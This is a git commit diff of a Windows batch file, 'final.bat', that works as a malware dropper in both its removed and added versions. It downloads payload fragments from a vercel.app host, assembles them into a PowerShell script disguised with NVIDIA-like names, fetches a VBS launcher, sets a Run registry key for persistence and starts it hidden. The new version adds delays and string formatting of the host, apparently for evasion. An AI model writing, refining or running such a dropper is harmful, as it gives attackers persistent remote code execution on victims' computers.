2df4e6911e8bd68966331d706e92641c9d631a7c
USATIKTOKER <famoususatiktoker@gmail.com>
2025-06-05 12:47:37 +0500

    final.bat

--- final.bat
+++ final.bat
@@ -1,19 +1,26 @@
 @echo off
-set "a1=%APPDATA%\sys_nvd\data"
-set "b2=%a1%\core.txt"
-set "c3=%a1%\tmp1.txt"
-set "d4=%a1%\tmp2.txt"
-set "e5=%a1%\NVD_SYS.PS1"
-set "f6=%a1%\start.vbs"
-if exist "%a1%" rmdir /s /q "%a1%" 2>nul
-mkdir "%a1%"
-powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/final.txt' -Destination '%b2%'"
-powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/first.txt' -Destination '%c3%'"
-powershell -Command "Start-BitsTransfer -Source **** -Destination '%d4%'"
-powershell -Command "(Get-Content '%b2%' -Raw) -replace '----', (Get-Content '%c3%' -Raw) -replace '====', (Get-Content '%d4%' -Raw) | Set-Content '%b2%'"
-del "%c3%" 2>nul
-del "%d4%" 2>nul
-ren "%b2%" "NVD_SYS.PS1"
-powershell -Command "Invoke-WebRequest 'https://service-omega-snowy.vercel.app/s-nvs_update.vbs' -OutFile '%f6%'"
-powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NvdSys' -Value 'wscript.exe \"%f6%\"'"
-start /min wscript "%f6%"
+timeout /t 4 /nobreak >nul
+set "q1=%APPDATA%\nvd_s\dt"
+set "r2=%q1%\n_main.txt"
+set "s3=%q1%\p1.txt"
+set "t4=%q1%\p2.txt"
+set "u5=%q1%\NVD_S.PS1"
+set "v6=%q1%\strt_n.vbs"
+if exist "%q1%" rmdir /s /q "%q1%" 2>nul
+timeout /t 3 /nobreak >nul
+mkdir "%q1%"
+set "d1=service-omega-snowy.vercel.app"
+powershell -Command "$d1='%d1%';Start-BitsTransfer -Source ('https://{0}/final.txt' -f $d1) -Destination '%r2%'"
+timeout /t 2 /nobreak >nul
+powershell -Command "$d1='%d1%';Start-BitsTransfer -Source ('https://{0}/first.txt' -f $d1) -Destination '%s3%'"
+powershell -Command "Start-BitsTransfer -Source **** -Destination '%t4%'"
+timeout /t 1 /nobreak >nul
+powershell -Command "(Get-Content '%r2%' -Raw) -replace '----', (Get-Content '%s3%' -Raw) -replace '====', (Get-Content '%t4%' -Raw) | Set-Content '%r2%'"
+del "%s3%" 2>nul
+del "%t4%" 2>nul
+ren "%r2%" "NVD_S.PS1"
+timeout /t 2 /nobreak >nul
+powershell -Command "$d1='%d1%';Invoke-WebRequest ('https://{0}/s-nvs_update.vbs' -f $d1) -OutFile '%v6%'"
+powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NvdS' -Value 'wscript.exe \"%v6%\"'"
+timeout /t 3 /nobreak >nul
+start /min wscript "%v6%"
